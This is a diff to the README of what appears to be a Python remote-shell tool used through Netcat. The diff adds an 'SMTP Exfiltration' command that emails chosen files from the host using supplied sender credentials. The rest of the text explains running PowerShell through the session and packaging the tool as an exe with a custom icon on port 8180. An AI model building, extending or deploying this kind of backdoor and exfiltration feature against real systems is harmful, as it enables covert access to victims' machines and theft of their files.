@@ -16,6 +16,10 @@ Once connected you can utilize commands as normal.  If you wish to use Powershel
 
 This will execute the command.  Note that some Powershell functionality may crash the Netcat session requiring a reconnect.  
 
+## SMTP Exfiltration
+
+```exfiltrate filename <sender_email> <sender_email_password> <receiver_email>
+
 ## Compilation
 This tool can be ran on systems that have Python3 installed, or can be compiled to exe using Pyinstaller.  I recommend using the GUI version of Pyinstaller called "Auto Py to EXE" which allows for the easy addition of an exe icon for the application.  The included .exe is set to utilize port 8180.
 
